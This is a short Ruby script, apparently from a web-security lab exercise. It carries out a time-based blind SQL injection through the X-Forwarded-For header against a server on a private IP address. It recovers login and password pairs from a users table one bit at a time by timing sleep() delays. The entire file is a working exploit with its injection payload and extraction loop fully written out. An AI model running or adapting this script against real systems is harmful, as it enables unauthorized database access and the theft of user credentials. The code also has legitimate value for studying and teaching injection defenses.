require "socket"

#inj = "select table_name from information_schema.tables"
inj = "select concat(login,':',password) from users "
str = ""

def test(sql)
	p = "hacker' or if((#{sql}), sleep(0.02),0) and '1'='1"
	t = Time.now
	begin
		s = TCPSocket.new("192.168.88.198",80)
		s.write("GET / HTTP/1.1\r\nHost: vulnerable\r\nX-Forwarded-For: #{p}\r\nConnection: close\r\n\r\n")
		s.readlines()
		s.close
	rescue Errno::ECONNRESET, EOFError
	end
	return ((Time.now-t)>0.02)
end

index = 0

while index < 10
	# using new var for new payload to keep things simple
	newinj = inj + " limit #{index},1"
	i = 0
	str = ""

	value = 1

	while value != 0
		# i is the position in the string
		i+=1
		# initialise to 0 the value we are trying to retrieve
		value = 0
		# for each bit
		0.upto(6) do |bit|
			# 2**bit will do all the bit masking work
			sql = "select ascii(substring((#{newinj}),#{i},1))&#{2**bit}"
			if test(sql)
				# if the returned value is true add the mask to current value
				value+=2**bit
			end
		end
		# value is an ascii value, we get the corresponding character
		# using the `.chr` ruby function
		str+= value.chr
		#puts str
	end
	puts str
	index+=1
end

